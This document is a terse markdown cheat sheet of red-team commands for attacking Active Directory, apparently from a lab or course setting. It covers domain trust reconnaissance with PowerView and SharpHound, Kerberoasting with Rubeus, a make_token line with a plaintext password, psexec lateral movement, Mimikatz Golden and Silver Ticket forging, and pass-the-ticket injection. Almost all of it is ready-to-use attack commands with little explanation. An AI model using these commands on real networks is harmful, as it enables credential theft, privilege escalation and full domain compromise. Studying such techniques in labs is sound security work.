### Domain Trusts Recon
```

powershell Get-DomainTrust -Domain dev.insomnia.io 
powershell Get-DomainComputer -Domain dev.insomnia.io | select DnsHostName
SharpHound3 "-c All -D dev.insomnia.io"
execute-assembly C:\tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -D cyberbotic.io 
SharpView "Get-DomainUser -SPN -Domain dev.insomnia.io -Properties SamAccountName"
Rubeus kerberoast /domain:dev.insomnia.io 
make_token dev.insomnia.io \bridgesb Scorpion!
ls \\dtop685.dev.insomnia.io \c$
jump psexec dtop685.dev.insomnia.io SMB
```
### Bidirectional Parent/Child
```
powershell Get-DomainTrust
powershell Get-DomainComputer -Domain acmebank.io  | select DnsHostName
powershell Get-DomainGroup -Identity 'Domain Admins' -Domain acmebank.io  | select ObjectSid
kerberos::golden /user:<> /domain:<Current Domain Name> /sid:<> /sids:<> /krbtgt:<>

```

### Golden Tickets

```
kerberos::golden /user:Administrator /domain:cyberbotic.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /krbtgt:REDACTED /ticket:golden.kirbi

[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\golden.kirbi"))

execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket:

```
### Silver Tickets
```
powershell [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
kerberos::golden /user:<> /domain:<> /sid:<> /target:<> /service:<> /rc4:<> /ticket:silver.kirbi
kerberos::golden /user:Administrator /domain:Insomnia.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /target:dc-1.cyberbotic.io /service:cifs /rc4: /ticket:silver.kirbi

[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\silver.kirbi"))

execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket:


```
